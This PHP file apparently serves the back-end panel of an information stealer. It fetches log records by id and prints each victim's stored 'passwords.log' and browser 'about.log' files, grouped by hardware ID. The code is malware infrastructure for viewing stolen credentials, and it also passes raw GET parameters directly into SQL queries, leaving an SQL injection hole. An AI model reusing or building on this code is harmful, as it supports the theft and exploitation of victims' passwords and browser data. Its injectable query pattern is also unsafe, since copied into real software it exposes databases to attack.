<?php
   session_start();
   include 'database.php';
	require_once("auth.php");
   if(isset($_GET['passwords'])){
	   $password = $_GET['passwords'];
	   $f = $pdoConnection->query("SELECT id, hwid FROM `logs` WHERE id = ".$password)->fetch(PDO::FETCH_ASSOC);
	   $file = str_replace("\n","<br>",file_get_contents('logs/'.$f['hwid'].'_'.$f['id'].'/passwords.log'));
	   if($file==""){
		   echo "Nothing";
	   }else{
		   echo $file;
	   }
   }else if(isset($_GET['browsers'])){
	   $browsers = $_GET['browsers'];
	   $f = $pdoConnection->query("SELECT id, hwid FROM `logs` WHERE id = ".$browsers)->fetch(PDO::FETCH_ASSOC);
	   $file = str_replace("\n","<br>",file_get_contents('logs/'.$f['hwid'].'_'.$f['id'].'/about.log'));
	   if($file==""){
		   echo "Nothing";
	   }else{
		   echo $file;
	   }


   }
?>
